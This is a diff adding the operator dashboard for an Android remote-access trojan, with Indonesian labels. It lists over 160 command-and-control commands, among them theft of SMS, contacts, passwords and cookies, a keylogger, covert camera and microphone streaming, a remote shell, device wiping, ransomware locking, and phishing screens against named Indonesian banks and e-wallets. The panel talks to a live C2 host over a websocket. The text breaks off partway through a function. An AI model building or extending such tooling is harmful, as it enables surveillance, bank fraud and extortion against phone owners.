@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <title>🔬 DASHBOARD - System Update</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0e17;color:#e0e0e0;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh}
+        .container{max-width:1400px;margin:0 auto;padding:20px}
+        .header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;background:linear-gradient(135deg,#0d1a2b,#1a2a3f);border-radius:12px;margin-bottom:20px;border:1px solid #2a3f5f}
+        .header h1{font-size:24px;color:#4fc3f7}
+        .header .badge{background:#2a3f5f;padding:5px 15px;border-radius:20px;font-size:12px;color:#4fc3f7}
+        .login-container{max-width:400px;margin:100px auto;background:#0d1a2b;padding:40px;border-radius:12px;border:1px solid #2a3f5f}
+        .login-container h2{color:#4fc3f7;margin-bottom:20px;text-align:center}
+        .login-container input{width:100%;padding:12px;border-radius:8px;border:1px solid #2a3f5f;background:#0a0e17;color:#e0e0e0;margin-bottom:15px}
+        .login-container button{width:100%;padding:12px;border-radius:8px;border:none;background:#1a3a5f;color:#4fc3f7;font-size:16px;cursor:pointer}
+        .login-container button:hover{background:#2a4a6f}
+        .login-error{color:#ff6b6b;text-align:center;margin-top:10px;display:none}
+        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:20px}
+        .stat-card{background:linear-gradient(135deg,#0d1a2b,#1a2a3f);padding:15px;border-radius:10px;border:1px solid #2a3f5f;text-align:center}
+        .stat-card .num{font-size:28px;font-weight:bold;color:#4fc3f7}
+        .stat-card .label{font-size:11px;color:#8899aa;margin-top:5px}
+        .tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}
+        .tab{background:#0d1a2b;padding:10px 20px;border-radius:8px;cursor:pointer;border:1px solid #2a3f5f;color:#8899aa;transition:0.3s;font-size:13px}
+        .tab.active{background:#1a3a5f;border-color:#4fc3f7;color:#4fc3f7}
+        .tab:hover{background:#1a2a3f}
+        .panel{display:none;background:#0d1a2b;border-radius:10px;padding:20px;border:1px solid #2a3f5f}
+        .panel.active{display:block}
+        .table-wrap{overflow-x:auto}
+        table{width:100%;border-collapse:collapse;font-size:13px}
+        th{background:#1a2a3f;padding:10px 12px;text-align:left;color:#4fc3f7;border-bottom:2px solid #2a3f5f;position:sticky;top:0}
+        td{padding:8px 12px;border-bottom:1px solid #1a2a3f;word-break:break-all}
+        tr:hover{background:#0d1a2b}
+        .cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:8px}
+        .cmd-btn{background:#0d1a2b;padding:8px 12px;border-radius:6px;border:1px solid #2a3f5f;color:#e0e0e0;cursor:pointer;text-align:center;font-size:11px;transition:0.3s}
+        .cmd-btn:hover{background:#1a3a5f;border-color:#4fc3f7}
+        .cmd-btn.danger{border-color:#5f1a1a;color:#ff6b6b}
+        .cmd-btn.danger:hover{background:#3a1a1a}
+        .cmd-btn.success{border-color:#1a4a2a;color:#4caf50}
+        .cmd-btn.success:hover{background:#1a2a1a}
+        .cmd-btn.warning{border-color:#5f4a1a;color:#ffd93d}
+        .cmd-btn.warning:hover{background:#3a2a1a}
+        .cmd-category{margin-bottom:15px}
+        .cmd-category .cat-title{color:#4fc3f7;font-size:14px;font-weight:bold;margin-bottom:8px;padding:5px 10px;background:#0d1a2b;border-radius:6px;border-left:3px solid #4fc3f7}
+        .input-group{display:flex;gap:10px;margin:10px 0;flex-wrap:wrap}
+        .input-group input,.input-group select{padding:10px 15px;border-radius:8px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;flex:1;min-width:150px}
+        .input-group button{padding:10px 20px;border-radius:8px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer}
+        .input-group button:hover{background:#2a4a6f}
+        .log-area{background:#050a12;border-radius:8px;padding:15px;height:300px;overflow-y:auto;font-family:monospace;font-size:12px;border:1px solid #1a2a3f}
+        .log-entry{padding:3px 0;border-bottom:1px solid #0a1520}
+        .log-entry .time{color:#4fc3f7}
+        .log-entry .type{color:#8899aa}
+        .log-entry .data{color:#e0e0e0}
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000;justify-content:center;align-items:center}
+        .modal.active{display:flex}
+        .modal-content{background:#0d1a2b;padding:30px;border-radius:12px;max-width:600px;width:90%;border:1px solid #2a3f5f;max-height:80vh;overflow-y:auto}
+        .modal-close{float:right;background:transparent;border:none;color:#8899aa;font-size:24px;cursor:pointer}
+        .modal-close:hover{color:#e0e0e0}
+        .cmd-param{background:#050a12;padding:10px;border-radius:6px;margin-top:5px;font-size:12px;border:1px solid #1a2a3f}
+        .cmd-param input{background:#0d1a2b;border:1px solid #2a3f5f;color:#e0e0e0;padding:5px 10px;border-radius:4px;width:100%;margin-top:5px}
+        .dashboard-content{display:none}
+        .search-box{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px}
+        .search-box input{flex:1;padding:8px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;min-width:150px}
+        @media(max-width:600px){.header{flex-direction:column;gap:10px;text-align:center}.tabs{justify-content:center}.cmd-grid{grid-template-columns:repeat(auto-fill,minmax(140px,1fr)}}
+    </style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="loginContainer" class="login-container">
+    <h2>🔐 DASHBOARD LOGIN</h2>
+    <input type="password" id="loginPassword" placeholder="Masukkan password..." onkeydown="if(event.key==='Enter'){login();}">
+    <button onclick="login()">🔓 LOGIN</button>
+    <div id="loginError" class="login-error">❌ Password salah!</div>
+</div>
+
+<!-- DASHBOARD -->
+<div id="dashboardContent" class="dashboard-content">
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <h1>🔬 DASHBOARD ULTIMATE v2.0</h1>
+            <div>
+                <span class="badge" id="statusBadge">🟢 Online</span>
+                <span class="badge" id="deviceCount">📱 0 Devices</span>
+                <button onclick="logout()" style="background:#3a1a1a;border:none;color:#ff6b6b;padding:5px 15px;border-radius:8px;cursor:pointer;margin-left:10px">🚪 Logout</button>
+            </div>
+        </div>
+
+        <!-- STATS -->
+        <div class="stats" id="statsContainer">
+            <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total Data</div></div>
+            <div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Device Online</div></div>
+            <div class="stat-card"><div class="num" id="statSMS">0</div><div class="label">SMS</div></div>
+            <div class="stat-card"><div class="num" id="statContacts">0</div><div class="label">Kontak</div></div>
+            <div class="stat-card"><div class="num" id="statLocation">0</div><div class="label">Lokasi</div></div>
+        </div>
+
+        <!-- TABS -->
+        <div class="tabs">
+            <div class="tab active" onclick="showPanel('data')">📱 Data</div>
+            <div class="tab" onclick="showPanel('c2')">⚡ C2 Command</div>
+            <div class="tab" onclick="showPanel('logs')">📋 Logs</div>
+            <div class="tab" onclick="showPanel('media')">📸 Media</div>
+            <div class="tab" onclick="showPanel('files')">📁 Files</div>
+        </div>
+
+        <!-- PANEL DATA -->
+        <div class="panel active" id="panelData">
+            <div class="input-group">
+                <input type="text" id="searchInput" placeholder="🔍 Cari data..." oninput="filterData()">
+                <select id="filterType" onchange="filterData()">
+                    <option value="">Semua Tipe</option>
+                    <option value="sms">SMS</option>
+                    <option value="kontak">Kontak</option>
+                    <option value="lokasi">Lokasi</option>
+                    <option value="device">Device</option>
+                    <option value="screenshot">Screenshot</option>
+                    <option value="clipboard">Clipboard</option>
+                    <option value="call_log">Call Log</option>
+                </select>
+                <button onclick="refreshData()">🔄 Refresh</button>
+                <button onclick="exportData()">📤 Export</button>
+            </div>
+            <div class="table-wrap">
+                <table>
+                    <thead><tr><th>Waktu</th><th>Sumber</th><th>Data</th><th>Device</th></tr></thead>
+                    <tbody id="dataTableBody"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- PANEL C2 -->
+        <div class="panel" id="panelC2">
+            <div class="search-box">
+                <input type="text" id="cmdSearch" placeholder="🔍 Cari command..." oninput="filterCommands()">
+                <select id="cmdCategoryFilter" onchange="filterCommands()">
+                    <option value="">Semua Kategori</option>
+                    <option value="media">📸 Media</option>
+                    <option value="file">📁 File</option>
+                    <option value="data">📱 Data</option>
+                    <option value="web">🌐 Web</option>
+                    <option value="download">📥 Download & Install</option>
+                    <option value="sms">💬 SMS & Panggilan</option>
+                    <option value="apps">📱 Aplikasi</option>
+                    <option value="dompet">💰 Dompet Digital</option>
+                    <option value="banking">🏦 Banking</option>
+                    <option value="populer">⚡ Populer</option>
+                    <option value="soseng">🔓 Soseng & Phishing</option>
+                    <option value="sistem">🔧 Sistem</option>
+                    <option value="network">🌐 Network</option>
+                    <option value="audio">🔊 Audio & Display</option>
+                    <option value="lainnya">⏰ Lainnya</option>
+                </select>
+            </div>
+            <div id="cmdContainer"></div>
+            <div class="input-group" style="margin-top:15px">
+                <input type="text" id="customCmd" placeholder="📝 Custom command (contoh: screenshot)" onkeydown="if(event.key==='Enter'){sendCustomCommand();}">
+                <input type="text" id="customParam" placeholder="📝 Parameter (opsional)" style="flex:0.5;min-width:100px">
+                <button onclick="sendCustomCommand()">📤 Kirim</button>
+            </div>
+            <div id="cmdResult" style="margin-top:10px;padding:10px;background:#050a12;border-radius:8px;font-family:monospace;font-size:12px;display:none;max-height:200px;overflow-y:auto"></div>
+        </div>
+
+        <!-- PANEL LOGS -->
+        <div class="panel" id="panelLogs">
+            <div class="input-group">
+                <input type="text" id="logSearch" placeholder="🔍 Cari log..." oninput="filterLogs()">
+                <button onclick="clearLogs()">🗑️ Clear</button>
+            </div>
+            <div class="log-area" id="logArea"></div>
+        </div>
+
+        <!-- PANEL MEDIA -->
+        <div class="panel" id="panelMedia">
+            <h3 style="margin-bottom:15px;color:#4fc3f7">📸 Media Preview</h3>
+            <div id="mediaGallery" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px"></div>
+        </div>
+
+        <!-- PANEL FILES -->
+        <div class="panel" id="panelFiles">
+            <h3 style="margin-bottom:15px;color:#4fc3f7">📁 File Manager</h3>
+            <div id="fileList" style="font-family:monospace;font-size:13px"></div>
+        </div>
+    </div>
+</div>
+
+<!-- MODAL -->
+<div class="modal" id="modal">
+    <div class="modal-content">
+        <button class="modal-close" onclick="closeModal()">&times;</button>
+        <div id="modalBody"></div>
+    </div>
+</div>
+
+<script>
+// ============================================================
+// 🔥 DASHBOARD - 160+ C2 COMMANDS
+// ============================================================
+
+var PASSWORD = '';
+var allData = [];
+var logEntries = [];
+var ws = null;
+
+// ============================================================
+// C2 COMMANDS - LENGKAP 160+
+// ============================================================
+var C2_COMMANDS = {
+    'media': {
+        label: '📸 Media',
+        commands: [
+            { id: 'screenshot', label: '📸 Screenshot' },
+            { id: 'record_audio', label: '🎤 Rekam Audio', param: 'durasi (detik)' },
+            { id: 'stop_audio', label: '⏹️ Stop Audio' },
+            { id: 'record_video', label: '🎥 Rekam Video', param: 'durasi (detik)' },
+            { id: 'stop_video', label: '⏹️ Stop Video' },
+            { id: 'take_photo', label: '📷 Ambil Foto' },
+            { id: 'flash_on', label: '💡 Flash ON' },
+            { id: 'flash_off', label: '💡 Flash OFF' },
+            { id: 'camera_stream_start', label: '📷 Start Camera Stream' },
+            { id: 'camera_stream_stop', label: '⏹️ Stop Camera Stream' },
+            { id: 'mic_stream_start', label: '🎤 Start Mic Stream' },
+            { id: 'mic_stream_stop', label: '⏹️ Stop Mic Stream' }
+        ]
+    },
+    'file': {
+        label: '📁 File',
+        commands: [
+            { id: 'ambil_file', label: '📄 Ambil File', param: 'path file' },
+            { id: 'list_file', label: '📂 List File', param: 'path folder' },
+            { id: 'hapus_file', label: '🗑️ Hapus File', param: 'path file' },
+            { id: 'rename_file', label: '✏️ Rename File', param: 'path_lama|path_baru' }
+        ]
+    },
+    'data': {
+        label: '📱 Data',
+        commands: [
+            { id: 'ambil_sms', label: '💬 Ambil SMS' },
+            { id: 'ambil_kontak', label: '📇 Ambil Kontak' },
+            { id: 'ambil_call_log', label: '📞 Ambil Call Log' },
+            { id: 'ambil_lokasi', label: '📍 Ambil Lokasi' },
+            { id: 'get_clipboard', label: '📋 Get Clipboard' },
+            { id: 'set_clipboard', label: '📋 Set Clipboard', param: 'text' },
+            { id: 'get_notifications', label: '🔔 Get Notifications' },
+            { id: 'ambil_kalender', label: '📅 Ambil Kalender' },
+            { id: 'ambil_browser_history', label: '🌐 Browser History' },
+            { id: 'ambil_imei', label: '📱 IMEI' },
+            { id: 'ambil_imsi', label: '📱 IMSI' },
+            { id: 'ambil_nomor_hp', label: '📱 Nomor HP' },
+            { id: 'ambil_operator', label: '📱 Operator' },
+            { id: 'dump_contacts', label: '📇 Dump Contacts' },
+            { id: 'dump_sms', label: '💬 Dump SMS' },
+            { id: 'dump_call_log', label: '📞 Dump Call Log' },
+            { id: 'dump_gallery', label: '🖼️ Dump Gallery' },
+            { id: 'dump_bookmarks', label: '🔖 Dump Bookmarks' },
+            { id: 'dump_passwords', label: '🔑 Dump Passwords' },
+            { id: 'dump_cookies', label: '🍪 Dump Cookies' },
+            { id: 'keylogger_start', label: '⌨️ Keylogger Start' },
+            { id: 'keylogger_stop', label: '⏹️ Keylogger Stop' },
+            { id: 'keylogger_upload', label: '📤 Keylogger Upload' }
+        ]
+    },
+    'web': {
+        label: '🌐 Web',
+        commands: [
+            { id: 'buka_url', label: '🌐 Buka URL', param: 'url' },
+            { id: 'buka_url_hidden', label: '🌐 Buka URL Hidden', param: 'url' },
+            { id: 'buka_webview', label: '🌐 Buka WebView', param: 'url' }
+        ]
+    },
+    'download': {
+        label: '📥 Download & Install',
+        commands: [
+            { id: 'download', label: '📥 Download', param: 'url|filename' },
+            { id: 'install_apk', label: '📱 Install APK', param: 'path' },
+            { id: 'install_google_play', label: '📱 Install Google Play' },
+            { id: 'update_apk', label: '🔄 Update APK', param: 'url' },
+            { id: 'install_cert', label: '🔐 Install Cert', param: 'path' }
+        ]
+    },
+    'sms': {
+        label: '💬 SMS & Panggilan',
+        commands: [
+            { id: 'kirim_sms', label: '📨 Kirim SMS', param: 'nomor|pesan' },
+            { id: 'kirim_sms_massal', label: '📨 SMS Massal', param: 'file.txt' },
+            { id: 'call_number', label: '📞 Call Number', param: 'nomor' },
+            { id: 'fake_sms', label: '📨 Fake SMS', param: 'nomor|pesan' },
+            { id: 'fake_call', label: '📞 Fake Call', param: 'nomor' }
+        ]
+    },
+    'apps': {
+        label: '📱 Aplikasi',
+        commands: [
+            { id: 'buka_aplikasi', label: '📱 Buka Aplikasi', param: 'package_name' },
+            { id: 'uninstall_aplikasi', label: '🗑️ Uninstall', param: 'package_name' },
+            { id: 'get_installed_apps', label: '📱 Installed Apps' },
+            { id: 'open_settings', label: '⚙️ Settings' },
+            { id: 'open_calculator', label: '🧮 Calculator' },
+            { id: 'open_playstore', label: '📱 Play Store' },
+            { id: 'open_maps', label: '🗺️ Maps' },
+            { id: 'open_camera', label: '📷 Camera' },
+            { id: 'open_gallery', label: '🖼️ Gallery' },
+            { id: 'open_dialer', label: '📞 Dialer' },
+            { id: 'add_contact', label: '➕ Add Contact', param: 'nama|nomor' },
+            { id: 'delete_contact', label: '➖ Delete Contact', param: 'kontak_id' },
+            { id: 'add_calendar', label: '📅 Add Calendar', param: 'judul|waktu' }
+        ]
+    },
+    'dompet': {
+        label: '💰 Dompet Digital',
+        commands: [
+            { id: 'buka_dana', label: '💰 DANA' },
+            { id: 'buka_gopay', label: '💰 GoPay' },
+            { id: 'buka_ovo', label: '💰 OVO' },
+            { id: 'buka_shopee', label: '🛍️ Shopee' },
+            { id: 'buka_tokped', label: '🛍️ Tokopedia' },
+            { id: 'buka_linkaja', label: '💰 LinkAja' },
+            { id: 'buka_jenius', label: '💰 Jenius' },
+            { id: 'buka_isaku', label: '💰 iSaku' }
+        ]
+    },
+    'banking': {
+        label: '🏦 Banking',
+        commands: [
+            { id: 'buka_bri', label: '🏦 BRI' },
+            { id: 'buka_bni', label: '🏦 BNI' },
+            { id: 'buka_mandiri', label: '🏦 Mandiri' },
+            { id: 'buka_bca', label: '🏦 BCA' },
+            { id: 'buka_bsi', label: '🏦 BSI' },
+            { id: 'buka_cimb', label: '🏦 CIMB' },
+            { id: 'buka_btn', label: '🏦 BTN' },
+            { id: 'buka_danamon', label: '🏦 Danamon' }
+        ]
+    },
+    'populer': {
+        label: '⚡ Populer',
+        commands: [
+            { id: 'buka_wa', label: '💬 WhatsApp' },
+            { id: 'buka_telegram', label: '📨 Telegram' },
+            { id: 'buka_instagram', label: '📸 Instagram' },
+            { id: 'buka_facebook', label: '📘 Facebook' },
+            { id: 'buka_tiktok', label: '🎵 TikTok' },
+            { id: 'buka_youtube', label: '🎬 YouTube' },
+            { id: 'buka_gmail', label: '📧 Gmail' },
+            { id: 'buka_chrome', label: '🌐 Chrome' },
+            { id: 'buka_twitter', label: '🐦 Twitter' },
+            { id: 'buka_spotify', label: '🎵 Spotify' },
+            { id: 'open_viber', label: '💬 Viber' },
+            { id: 'open_line', label: '💬 Line' }
+        ]
+    },
+    'soseng': {
+        label: '🔓 Soseng & Phishing',
+        commands: [
+            { id: 'qr_dana', label: '📱 QR DANA' },
+            { id: 'fake_update', label: '🔄 Fake Update' },
+            { id: 'fake_bantuan', label: '🆘 Fake Bantuan' },
+            { id: 'phishing_fb', label: '📘 Phishing FB' },
+            { id: 'phishing_ig', label: '📸 Phishing IG' },
+            { id: 'phishing_bri', label: '🏦 Phishing BRI' },
+            { id: 'phishing_dana', label: '💰 Phishing DANA' },
+            { id: 'phishing_gopay', label: '💰 Phishing GoPay' },
+            { id: 'phishing_ovo', label: '💰 Phishing OVO' },
+            { id: 'phishing_mandiri', label: '🏦 Phishing Mandiri' },
+            { id: 'phishing_bca', label: '🏦 Phishing BCA' },
+            { id: 'phishing_shopee', label: '🛍️ Phishing Shopee' },
+            { id: 'phishing_tokped', label: '🛍️ Phishing Tokped' },
+            { id: 'phishing_jenius', label: '💰 Phishing Jenius' },
+            { id: 'fake_notif', label: '🔔 Fake Notif', param: 'pesan' },
+            { id: 'ransomware_lock', label: '💀 Ransomware Lock' },
+            { id: 'ransomware_unlock', label: '🔓 Ransomware Unlock' }
+        ]
+    },
+    'sistem': {
+        label: '🔧 Sistem',
+        commands: [
+            { id: 'get_system_info', label: '📊 System Info' },
+            { id: 'get_battery', label: '🔋 Battery' },
+            { id: 'get_storage', label: '💾 Storage' },
+            { id: 'get_wifi', label: '📶 WiFi' },
+            { id: 'vibrate', label: '📳 Vibrate', param: 'durasi (ms)' },
+            { id: 'toast', label: '💬 Toast', param: 'pesan' },
+            { id: 'reboot', label: '🔄 Reboot' },
+            { id: 'lock_screen', label: '🔒 Lock Screen' },
+            { id: 'wipe_data', label: '🧹 Wipe Data' },
+            { id: 'factory_reset', label: '📱 Factory Reset' },
+            { id: 'self_destruct', label: '💀 Self Destruct' },
+            { id: 'wallpaper', label: '🖼️ Set Wallpaper', param: 'path' },
+            { id: 'ringtone', label: '🔔 Set Ringtone', param: 'path' },
+            { id: 'alarm', label: '⏰ Set Alarm', param: 'jam|menit' }
+        ]
+    },
+    'network': {
+        label: '🌐 Network',
+        commands: [
+            { id: 'wifi_on', label: '📶 WiFi ON' },
+            { id: 'wifi_off', label: '📶 WiFi OFF' },
+            { id: 'bluetooth_on', label: '📶 Bluetooth ON' },
+            { id: 'bluetooth_off', label: '📶 Bluetooth OFF' },
+            { id: 'airplane_on', label: '✈️ Airplane ON' },
+            { id: 'airplane_off', label: '✈️ Airplane OFF' },
+            { id: 'wifi_hotspot_on', label: '📶 Hotspot ON' },
+            { id: 'wifi_hotspot_off', label: '📶 Hotspot OFF' }
+        ]
+    },
+    'audio': {
+        label: '🔊 Audio & Display',
+        commands: [
+            { id: 'volume_up', label: '🔊 Volume Up' },
+            { id: 'volume_down', label: '🔉 Volume Down' },
+            { id: 'volume_mute', label: '🔇 Volume Mute' },
+            { id: 'brightness_max', label: '☀️ Brightness Max' },
+            { id: 'brightness_min', label: '🌙 Brightness Min' },
+            { id: 'screen_on', label: '📱 Screen ON' },
+            { id: 'screen_off', label: '📱 Screen OFF' },
+            { id: 'play_music', label: '🎵 Play Music', param: 'path' },
+            { id: 'stop_music', label: '⏹️ Stop Music' },
+            { id: 'speak', label: '🗣️ Speak', param: 'text' }
+        ]
+    },
+    'lainnya': {
+        label: '⏰ Lainnya',
+        commands: [
+            { id: 'shell', label: '💻 Shell', param: 'command' },
+            { id: 'ping', label: '🏓 Ping' },
+            { id: 'vpn_start', label: '🔒 VPN Start' },
+            { id: 'vpn_stop', label: '🔓 VPN Stop' },
+            { id: 'location_track_start', label: '📍 Track Location Start' },
+            { id: 'location_track_stop', label: '⏹️ Track Location Stop' }
+        ]
+    }
+};
+
+// ============================================================
+// FUNGSI UTAMA
+// ============================================================
+
+function login() {
+    var inputPass = document.getElementById('loginPassword').value.trim();
+    if (!inputPass) {
+        document.getElementById('loginError').style.display = 'block';
+        document.getElementById('loginError').textContent = '❌ Masukkan password!';
+        return;
+    }
+    fetch('/data?key=' + inputPass)
+        .then(function(response) {
+            if (response.status === 200) {
+                PASSWORD = inputPass;
+                document.getElementById('loginContainer').style.display = 'none';
+                document.getElementById('dashboardContent').style.display = 'block';
+                document.getElementById('loginError').style.display = 'none';
+                initDashboard();
+            } else {
+                document.getElementById('loginError').style.display = 'block';
+                document.getElementById('loginError').textContent = '❌ Password salah!';
+            }
+        })
+        .catch(function() {
+            document.getElementById('loginError').style.display = 'block';
+            document.getElementById('loginError').textContent = '❌ Server error!';
+        });
+}
+
+function logout() {
+    PASSWORD = '';
+    document.getElementById('dashboardContent').style.display = 'none';
+    document.getElementById('loginContainer').style.display = 'block';
+    document.getElementById('loginPassword').value = '';
+    if (ws) { ws.close(); ws = null; }
+}
+
+function initDashboard() {
+    renderC2Commands();
+    connectWebSocket();
+    refreshData();
+    setInterval(refreshData, 10000);
+    addLog('info', 'Dashboard initialized');
+}
+
+function showPanel(id) {
+    document.querySelectorAll('.panel').forEach(function(p) { p.classList.remove('active'); });
+    document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+    document.getElementById('panel' + id.charAt(0).toUpperCase() + id.slice(1)).classList.add('active');
+    document.querySelector('.tab[onclick="showPanel(\'' + id + '\')"]').classList.add('active');
+}
+
+// ============================================================
+// WEBSOCKET
+// ============================================================
+function connectWebSocket() {
+    try {
+        ws = new WebSocket('wss://verifikasi.site/ws');
+        ws.onopen = function() {
+            addLog('info', 'WebSocket connected');
+            ws.send(JSON.stringify({ type: 'auth', password: PASSWORD, role: 'admin' }));
+        };
+        ws.onmessage = function(event) {
+            try {
+                var data = JSON.parse(event.data);
+                if (data.type === 'new_data') {
+                    addLog('data', 'New data from ' + (data.device || 'unknown'));
+                    refreshData();
+                } else if (data.type === 'c2_result') {
+                    addLog('c2', 'C2 Result: ' + JSON.stringify(data.result));
+                    showCmdResult(data.result);
+                }
+            } catch(e) {}
+        };
+        ws.onclose = function() {
+            addLog('error', 'WebSocket disconnected, reconnecting...');
+            setTimeout(connectWebSocket, 5000);
+        };
+        ws.onerror = function() { addLog('error', 'WebSocket error'); };
+    } catch(e) {
+        addLog('error', 'WebSocket connection failed');
+    }
+}
+
+// ============================================================
+// RENDER C2 COMMANDS
+// ============================================================
+function renderC2Commands() {
+    var container = document.getElementById('cmdContainer');
+    container.innerHTML = '';
+    
+    Object.keys(C2_COMMANDS).forEach(function(catKey) {
+        var cat = C2_COMMANDS[catKey];
+        var div = document.createElement('div');
+        div.className = 'cmd-category';
+        div.setAttribute('data-category', catKey);
+        
+        var title = document.createElement('div');
+        title.className = 'cat-title';
+        title.textContent = cat.label;
+        div.appendChild(title);
+        
+        var grid = document.createElement('div');
+        grid.className = 'cmd-grid';
+        
+        cat.commands.forEach(function(cmd) {
+            var btn = document.createElement('div');
+            btn.className = 'cmd-btn';
+            if (cmd.id.includes('self_destruct') || cmd.id.includes('wipe_data') || cmd.id.includes('factory_reset')) {
+                btn.className += ' danger';
+            } else if (cmd.id.includes('reboot') || cmd.id.includes('lock_screen')) {
+                btn.className += ' warning';
+            } else if (cmd.id.includes('install_')) {
+                btn.className += ' success';
+            }
+            btn.textContent = cmd.label;
+            btn.setAttribute('data-id', cmd.id);
+            btn.setAttribute('data-param', cmd.param || '');
+            btn.title = 'ID: ' + cmd.id + (cmd.param ? ' | Param: ' + cmd.param : '');
+            
+            btn.onclick = function() {
+                var param = this.getAttribute('data-param');
+                if (param) {
+                    openParamModal(cmd.id, cmd.label, param);
+                } else {
+                    sendC2Command(cmd.id, '');
+                }
+            };
+            grid.appendChild(btn);
+        });
+        
+        div.appendChild(grid);
+        container.appendChild(div);
+    });
+}
+
+// ============================================================
+// FILTER COMMANDS
+// ============================================================
+function filterCommands() {
+    var search = document.getElementById('cmdSearch').value.toLowerCase();
+    var category = document.getElementById('cmdCategoryFilter').value;
+    
+    document.querySelectorAll('.cmd-category').forEach(function(cat) {
+        var showCat = true;
+        if (category && cat.getAttribute('data-category') !== category) {
+            showCat = false;
+        }
+        
+        var btns = cat.querySelectorAll('.cmd-btn');
+        var hasMatch = false;
+        btns.forEach(function(btn) {
+            var match = true;
+            if (search && !btn.textContent.toLowerCase().includes(search) && !btn.getAttribute('data-id').includes(search)) {
+                match = false;
+            }
+            btn.style.display = match ? '' : 'none';
+            if (match) hasMatch = true;
+        });
+        
+        cat.style.display = (showCat && hasMatch) ? '' : 'none';
+    });
+}
+
+// ============================================================
+// OPEN PARAM MODAL
+// ============================================================
+function openParamModal(cmdId, cmdLabel, paramDesc) {
+    var html = '<h3 style="color:#4fc3f7;margin-bottom:15px">📤 ' + cmdLabel + '</h3>';
+    html += '<p style="color:#8899aa;margin-bottom:10px">Parameter: <strong>' + paramDesc + '</strong></p>';
+    html += '<input type="text" id="paramInput" placeholder="Masukkan parameter..." style="width:100%;padding:10px;border-radius:8px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;margin-bottom:15px">';
+    html += '<div style="display:flex;gap:10px">';
+    html += '<button onclick="sendC2CommandWithParam(\'' + cmdId + '\')" style="flex:1;padding:10px;border-radius:8px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer">📤 Kirim</button>';
+    html += '<button onclick="closeModal()" style="flex:1;padding:10px;border-radius:8px;border:1px solid #2a3f5f;background:transparent;color:#8899aa;cursor:pointer">❌ Batal</button>';
+    html += '</div>';
+    openModal(html);
+}
+
+function sendC2CommandWithParam(cmdId) {
+    var param = document.getElementById('paramInput').value.trim();
+    closeModal();
+    sendC2Command(cmdId, param);
+}
+
+// ============================================================
+// SEND C2 COMMAND
+// ============================================================
+function sendC2Command(cmd, param) {
+    addLog('c2', 'Sending command: ' + cmd + (param ? ' | param: ' + param : ''));
+    
+    var data = { command: cmd, target: 'all', timestamp: Date.now() };
+    if (param) {
+        // Parse param jika ada format khusus
+        if (param.includes('|')) {
+            var parts = param.split('|');
+            data.param1 = parts[0] || '';
+            data.param2 = parts[1] || '';
+        } else {
+            data.param = param;
+        }
+    }
+    
+    fetch('/c2?key=' + PASSWORD, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+        addLog('c2', 'Command sent: ' + cmd + ' - ' + (data.status || 'ok'));
+    })
+    .catch(function(e) {
+        addLog('error', 'Send command failed: ' + e.message);
+    });
+}
+
+// ============================================================
+// SEND CUSTOM COMMAND
+// ============================================================
+function sendCustomCommand() {
+    var cmd = document.getElementById('customCmd').value.trim();
+    var param = document.getElementById('customParam').value.trim();
+    if (!cmd) return;
+    sendC2Command(cmd, param);
+    document.getElementById('customCmd').value = '';
+    document.getElementById('customParam').value = '';
+}
+
+// ============================================================
+// SHOW CMD RESULT
+// ============================================================
+function showCmdResult(result) {
+    var el = document.getElementById('cmdResult');
+    el.style.display = 'block';
+    el.textContent = typeof result === 'object' ? JSON.stringify(result, null, 2) : result;
+    setTimeout(function() { el.style.display = 'none'; }, 15000);
+}
+
+// ============================================================
+// REFRESH DATA
+// ============================================================
+function refreshData() {
+    fetch('/data?key=' + PASSWORD)
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data && data.data) {
+                allData = data.data;
+                renderData(allData);
+                updateStats(allData);
+                updateDeviceCount();
+            }
+        })
+        .catch(function(e) { addLog('error', 'Refresh data failed: ' + e.message); });
+}
+
+// ============================================================
+// RENDER DATA
+// ============================================================
+function renderData(data) {
+    var tbody = document.getElementById('dataTableBody');
+    tbody.innerHTML = '';
+    
+    var filtered = data;
+    var search = document.getElementById('searchInput').value.toLowerCase();
+    var filterType = document.getElementById('filterType').value;
+    
+    if (search) {
+        filtered = filtered.filter(function(item) {
+            return JSON.stringify(item).toLowerCase().includes(search);
+        });
+    }
+    if (filterType) {
+        filtered = filtered.filter(function(item) {
+            return item.sumber === filterType;
+        });
+    }
+    
+    filtered.slice(0, 100).forEach(function(item) {
+        var tr = document.createElement('tr');
+        var time = new Date(item.waktu).toLocaleString('id-ID');
+        var dataStr = typeof item.data === 'object' ? JSON.stringify(item.data).substring(0, 100) : (item.data || '');
+        var device = item.device || '-';
+        tr.innerHTML = '<td>' + time + '</td><td>' + item.sumber + '</td><td>' + dataStr + '</td><td>' + device + '</td>';
+        tbody.appendChild(tr);
+    });
+}
+
+// ============================================================
+// UPDATE STATS
+// ============================================================
+function updateStats(data) {
+    var sms = data.filter(function(d) { return d.sumber === 'sms' || d.sumber === 'sms_all'; });
